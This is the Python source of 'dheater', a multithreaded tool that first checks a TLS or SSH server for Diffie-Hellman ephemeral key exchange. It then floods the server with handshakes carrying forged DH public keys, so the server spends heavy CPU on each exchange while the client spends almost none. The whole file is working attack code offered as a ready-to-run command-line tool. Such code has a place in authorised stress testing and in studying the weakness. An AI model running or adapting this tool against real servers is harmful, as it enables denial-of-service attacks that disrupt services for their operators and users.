#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import os
import time
import socket
import struct
import threading

import abc
import attr
import urllib3

from cryptoparser.common.algorithm import Authentication
from cryptoparser.common.exception import InvalidType, NotEnoughData

from cryptoparser.tls.algorithm import TlsSignatureAndHashAlgorithm
from cryptoparser.tls.ciphersuite import TlsCipherSuite
from cryptoparser.tls.record import TlsRecord
from cryptoparser.tls.subprotocol import TlsHandshakeType
from cryptoparser.tls.version import TlsProtocolVersionFinal, TlsVersion

from cryptoparser.ssh.record import SshRecordInit, SshRecordKexDH, SshRecordKexDHGroup
from cryptoparser.ssh.subprotocol import (
    SshProtocolMessage,
    SshDHGroupExchangeInit,
    SshDHGroupExchangeRequest,
    SshDHKeyExchangeInit,
)
from cryptoparser.ssh.version import SshProtocolVersion, SshVersion

from cryptolyzer.common.dhparam import (
    DHPublicKey,
    WellKnownDHParams,
    get_dh_ephemeral_key_forged,
    int_to_bytes,
    parse_tls_dh_params
)
from cryptolyzer.common.exception import SecurityError, NetworkError
import cryptolyzer.tls.versions
from cryptolyzer.tls.client import (
    L7ClientTlsBase,
    TlsHandshakeClientHelloKeyExchangeDHE,
    TlsHandshakeClientHelloSpecalization,
)
from cryptolyzer.tls.exception import TlsAlert
import cryptolyzer.ssh.dhparams
import cryptolyzer.ssh.ciphers
from cryptolyzer.ssh.client import (
    L7ClientSsh,
    SshKeyExchangeInitAnyAlgorithm,
)

from dheater import __setup__


@attr.s
class DHEPreCheckResultBase():
    @property
    @abc.abstractmethod
    def key_size(self):
        raise NotImplementedError()

    @property
    @abc.abstractmethod
    def algorithm_name(self):
        raise NotImplementedError()


@attr.s(eq=False)
class DHEnforcerThreadStats(threading.Thread):
    failed_request_num = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    succeeded_request_num = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    sent_byte_count = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    received_byte_count = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))
    time_interval = attr.ib(init=False, default=0, validator=attr.validators.instance_of(int))


@attr.s(eq=False)
class DHEnforcerThreadBase(threading.Thread):
    uri = attr.ib(validator=attr.validators.instance_of(urllib3.util.url.Url))
    timeout = attr.ib(validator=attr.validators.instance_of(int))
    pre_check_result = attr.ib(default=None)
    message_bytes = attr.ib(init=False, default=bytearray(), validator=attr.validators.instance_of(bytearray))
    stop = attr.ib(init=False, default=False, validator=attr.validators.instance_of(bool))
    stats = attr.ib(
        init=False, default=DHEnforcerThreadStats(), validator=attr.validators.instance_of(DHEnforcerThreadStats)
    )

    @pre_check_result.validator
    def pre_check_result_validator(self, attribute, value):  # pylint: disable=no-self-use,unused-argument
        if value is not None and not isinstance(value, self._get_pre_check_type()):
            raise ValueError()

    @abc.abstractmethod
    def _get_client(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def _prepare_packets(self):
        raise NotImplementedError()

    @abc.abstractmethod
    def _send_packets(self, client):
        raise NotImplementedError()

    @classmethod
    @abc.abstractmethod
    def _get_pre_check_type(cls):
        raise NotImplementedError()

    @abc.abstractmethod
    def _pre_check(self):
        raise NotImplementedError()

    def __attrs_post_init__(self):
        if self.pre_check_result is None:
            self._pre_check()

        threading.Thread.__init__(self)

        self.message_bytes = self._prepare_packets()

    def run(self):
        start_time = time.time()
        while not self.stop:
            try:
                client = self._get_client()
                client.init_connection()
                sent_byte_count, received_byte_count = self._send_packets(client)
            except (ConnectionResetError, socket.timeout, socket.error, InvalidType, SecurityError, NotEnoughData):
                self.stats.failed_request_num += 1
            else:
                self.stats.received_byte_count += received_byte_count
                self.stats.sent_byte_count += sent_byte_count
                self.stats.succeeded_request_num += 1
        end_time = time.time()

        self.stats.time_interval = end_time - start_time


@attr.s
class DHEPreCheckResultSSH(DHEPreCheckResultBase):  # pylint: disable=too-few-public-methods
    ciphers_result = attr.ib(validator=attr.validators.instance_of(cryptolyzer.ssh.ciphers.AnalyzerResultCiphers))
    dhparams_result = attr.ib(validator=attr.validators.instance_of(cryptolyzer.ssh.dhparams.AnalyzerResultDHParams))

    def get_greatest_key_size_and_algorithm(self):
        dhparams_result = self.dhparams_result
        algorithm_with_greatest_key_size = None
        if dhparams_result.key_exchange:
            algorithm_with_greatest_key_size = sorted(
                dhparams_result.key_exchange.kex_algorithms,
                key=lambda algorithm: algorithm.value.key_size,
                reverse=True
            )[0]
            greatest_key_size = algorithm_with_greatest_key_size.value.key_size
        if (dhparams_result.group_exchange and
            (algorithm_with_greatest_key_size is None or
                dhparams_result.group_exchange.key_sizes[-1] > greatest_key_size)):
            algorithm_with_greatest_key_size = dhparams_result.group_exchange.gex_algorithms[0]
            greatest_key_size = dhparams_result.group_exchange.key_sizes[-1]

        return greatest_key_size, algorithm_with_greatest_key_size

    @property
    def key_size(self):
        greatest_key_size, _ = self.get_greatest_key_size_and_algorithm()

        return greatest_key_size

    @property
    def algorithm_name(self):
        _, algorithm_with_greatest_key_size = self.get_greatest_key_size_and_algorithm()

        return algorithm_with_greatest_key_size.value.code


class DHEnforcerThreadSSH(DHEnforcerThreadBase):
    group_exchange = attr.ib(init=False, default=False, validator=attr.validators.instance_of(bool))

    @classmethod
    def _get_pre_check_type(cls):
        return DHEPreCheckResultSSH

    @abc.abstractmethod
    def _pre_check(self):
        analyzer = cryptolyzer.ssh.dhparams.AnalyzerCiphers()
        ciphers_result = analyzer.analyze(self._get_client())

        analyzer = cryptolyzer.ssh.dhparams.AnalyzerDHParams()
        dhparams_result = analyzer.analyze(self._get_client())
        if dhparams_result.key_exchange is None and dhparams_result.group_exchange is None:
            raise NotImplementedError()

        self.pre_check_result = DHEPreCheckResultSSH(ciphers_result, dhparams_result)

    def _get_client(self):
        if self.uri.scheme is None:
            scheme = 'ssh'
        else:
            scheme = self.uri.scheme

        return L7ClientSsh.from_scheme(scheme, self.uri.host, self.uri.port, self.timeout)

    @classmethod
    def _get_shortest_algorithm(cls, algorithms):
        return min(algorithms, key=lambda algorithm: len(algorithm.value.code))

    def _prepare_packets(self):
        message_bytes = bytearray()
        protocol_message = SshProtocolMessage(
            protocol_version=SshProtocolVersion(SshVersion.SSH2, 0),
            software_version=f'{__setup__.__title__}_{__setup__.__version__}',
        )
        key_size, key_exchange_algorithm_with_greatest_key_size = \
            self.pre_check_result.get_greatest_key_size_and_algorithm()
        ciphers_result = self.pre_check_result.ciphers_result
        key_exchange_init_message = SshKeyExchangeInitAnyAlgorithm(
            kex_algorithms=[key_exchange_algorithm_with_greatest_key_size, ],
            host_key_algorithms=[self._get_shortest_algorithm(ciphers_result.host_key_algorithms), ],
            encryption_algorithms_client_to_server=[
                self._get_shortest_algorithm(ciphers_result.encryption_algorithms_client_to_server),
            ],
            encryption_algorithms_server_to_client=[
                self._get_shortest_algorithm(ciphers_result.encryption_algorithms_server_to_client),
            ],
            mac_algorithms_client_to_server=[
                self._get_shortest_algorithm(ciphers_result.mac_algorithms_client_to_server),
            ],
            mac_algorithms_server_to_client=[
                self._get_shortest_algorithm(ciphers_result.mac_algorithms_server_to_client),
            ],
            compression_algorithms_client_to_server=[
                self._get_shortest_algorithm(ciphers_result.compression_algorithms_client_to_server),
            ],
            compression_algorithms_server_to_client=[
                self._get_shortest_algorithm(ciphers_result.compression_algorithms_server_to_client),
            ],
        )
        message_bytes += protocol_message.compose()

        message_bytes += SshRecordInit(key_exchange_init_message).compose()

        well_known_dh_param_with_matching_key_size = [
            well_known_dh_param
            for well_known_dh_param in WellKnownDHParams
            if well_known_dh_param.value.key_size == key_size
        ][0]
        dh_ephemeral_public_key = get_dh_ephemeral_key_forged(
            well_known_dh_param_with_matching_key_size.value.dh_param_numbers.p
        )
        dh_ephemeral_public_key_bytes = int_to_bytes(dh_ephemeral_public_key, key_size).lstrip(b'\x00')

        if key_exchange_algorithm_with_greatest_key_size.value.key_size is not None:
            dh_key_exchange_init_message = SshDHKeyExchangeInit(dh_ephemeral_public_key_bytes)
            message_bytes += SshRecordKexDH(dh_key_exchange_init_message).compose()
        else:
            self.group_exchange = True

            dh_group_exchange_request_message = SshDHGroupExchangeRequest(
                gex_min=key_size, gex_max=key_size, gex_number=key_size
            )
            message_bytes += SshRecordKexDHGroup(dh_group_exchange_request_message).compose()

            dh_group_exchange_init_message = SshDHGroupExchangeInit(dh_ephemeral_public_key_bytes)
            message_bytes += SshRecordKexDHGroup(dh_group_exchange_init_message).compose()

        return message_bytes

    @classmethod
    def _skip_record(cls, client):
        received_byte_count = client.l4_transfer.receive(4)
        received_byte_count += client.l4_transfer.receive(struct.unpack('!I', client.l4_transfer.buffer)[0])
        client.l4_transfer.flush_buffer()

        return received_byte_count

    def _send_packets(self, client):
        sent_byte_count = client.send(self.message_bytes)

        # Receive protocol version exchange
        received_byte_count = client.l4_transfer.receive_line()
        client.l4_transfer.flush_buffer()

        # Receive key exchange init message
        received_byte_count += self._skip_record(client)

        if self.group_exchange:
            # Wait for DH group exchange group message
            received_byte_count += self._skip_record(client)

        # Wait for DH group/key exchange reply by receiving record length
        received_byte_count += client.l4_transfer.receive(4)

        return sent_byte_count, received_byte_count


@attr.s
class DHEPreCheckResultTLS(DHEPreCheckResultBase):  # pylint: disable=too-few-public-methods
    dh_public_key = attr.ib(validator=attr.validators.instance_of(DHPublicKey))
    cipher_suite = attr.ib(validator=attr.validators.instance_of(TlsCipherSuite))

    @property
    def key_size(self):
        return self.dh_public_key.key_size

    @property
    def algorithm_name(self):
        return self.cipher_suite.name


class DHEnforcerThreadTLS(DHEnforcerThreadBase):
    @classmethod
    def _get_pre_check_type(cls):
        return DHEPreCheckResultTLS

    def _pre_check(self):
        analyzer = cryptolyzer.tls.versions.AnalyzerVersions()
        analyzer_result_versions = analyzer.analyze(self._get_client(), None)

        protocol_version = min(analyzer_result_versions.versions)
        client_hello = TlsHandshakeClientHelloKeyExchangeDHE(protocol_version, self.uri.host)
        try:
            server_messages = self._get_client().do_tls_handshake(
                client_hello, last_handshake_message_type=TlsHandshakeType.SERVER_KEY_EXCHANGE
            )
        except (TlsAlert, NotEnoughData) as e:
            raise NotImplementedError() from e
        else:
            if TlsHandshakeType.SERVER_HELLO not in server_messages:
                raise NotImplementedError()

        self.pre_check_result = DHEPreCheckResultTLS(
            parse_tls_dh_params(server_messages[TlsHandshakeType.SERVER_KEY_EXCHANGE].param_bytes),
            server_messages[TlsHandshakeType.SERVER_HELLO].cipher_suite
        )

    def _get_client(self):
        if self.uri.scheme is None:
            scheme = 'tls'
        else:
            scheme = self.uri.scheme

        return L7ClientTlsBase.from_scheme(scheme, self.uri.host, self.uri.port, self.timeout)

    def _prepare_packets(self):
        protocol_version = TlsProtocolVersionFinal(TlsVersion.TLS1_2)
        cipher_suite = self.pre_check_result.cipher_suite
        if cipher_suite.value.authentication == Authentication.RSA:
            signature_algorithms = [
                TlsSignatureAndHashAlgorithm.RSA_SHA256,
                TlsSignatureAndHashAlgorithm.RSA_SHA1,
            ]
        elif cipher_suite.value.authentication == Authentication.ECDSA:
            signature_algorithms = [
                TlsSignatureAndHashAlgorithm.ECDSA_SHA256,
                TlsSignatureAndHashAlgorithm.ECDSA_SHA1,
            ]

        client_hello = TlsHandshakeClientHelloSpecalization(
            hostname=self.uri.host,
            protocol_versions=[protocol_version, ],
            cipher_suites=[cipher_suite, ],
            named_curves=[],
            signature_algorithms=signature_algorithms,
            extensions=[],
        )
        client_hello_bytes = TlsRecord(client_hello.compose()).compose()

        return client_hello_bytes

    def _send_packets(self, client):
        sent_byte_count = client.send(self.message_bytes)

        time.sleep(0.1)

        return sent_byte_count, 0


class ParseURI(argparse.Action):  # pylint: disable=too-few-public-methods
    def __init__(self, option_strings, dest, nargs=None, **kwargs):
        super().__init__(option_strings, dest, **kwargs)

    def __call__(
            self, parser, namespace, values, option_string=None, first=(True, )
    ):  # pylint: disable=too-many-arguments
        try:
            namespace.uri = urllib3.util.parse_url(values)
        except urllib3.exceptions.LocationParseError as e:
            raise argparse.ArgumentError(self, e.args[0])


def main():
    parser = argparse.ArgumentParser(description='Diffie-Hellman ephemeral key exchnage enforcer')
    parser.add_argument('--timeout', dest='timeout', default=5, help='socket timeout in seconds')
    parser.add_argument('--thread-num', dest='thread_num', default=1, type=int, help='number of threads to run')
    parser.add_argument(
        '--protocol', dest='protocol', required=True, choices=['tls', 'ssh', ], help='name of the protocol'
    )
    parser.add_argument('uri', metavar='uri', action=ParseURI, help='uri of the service')

    args = parser.parse_args()
    threads = []

    try:
        pre_check_result = None
        for _ in range(args.thread_num):
            try:
                if args.protocol == 'tls':
                    enforcer = DHEnforcerThreadTLS(args.uri, args.timeout, pre_check_result)
                elif args.protocol == 'ssh':
                    enforcer = DHEnforcerThreadSSH(args.uri, args.timeout, pre_check_result)
            except NetworkError as e:
                if pre_check_result is None:
                    print(
                        f'Network error oocuerd while checking whether Diffie-Hellman ephemeral (DHE) key exchange '
                        f'is supported by the server; uri="{args.uri}", error="{e}"'
                    )
                    return

                raise e from e

            pre_check_result = enforcer.pre_check_result
            threads.append(enforcer)
            enforcer.start()

        client = threads[0]._get_client()  # pylint: disable=protected-access
        print(os.linesep.join([
            '### Software',
            '',
            '    * Version: {}',
            '',
            '### Arguments',
            '',
            '    * Thread num: {}',
            '    * Protocol: {}',
            '    * Address: {}',
            '',
            '### Service',
            '',
            '    * IP: {}',
            '    * Port: {}',
            '    * Key size: {}',
            '    * Algorithm: {}',
        ]).format(
            __setup__.__version__,
            args.thread_num,
            client.get_scheme(),
            client.address,
            client.ip,
            client.port,
            pre_check_result.key_size,
            pre_check_result.algorithm_name,
        ))

        while True:
            time.sleep(0.2)
    except NotImplementedError:
        print(
            f'Diffie-Hellman ephemeral (DHE) key exchange not supported by the server; '
            f'uri="{args.uri}", protocol="{args.protocol}"'
        )
    except KeyboardInterrupt:
        for thread in threads:
            thread.stop = True
        for thread in threads:
            thread.join()


if __name__ == '__main__':
    main()
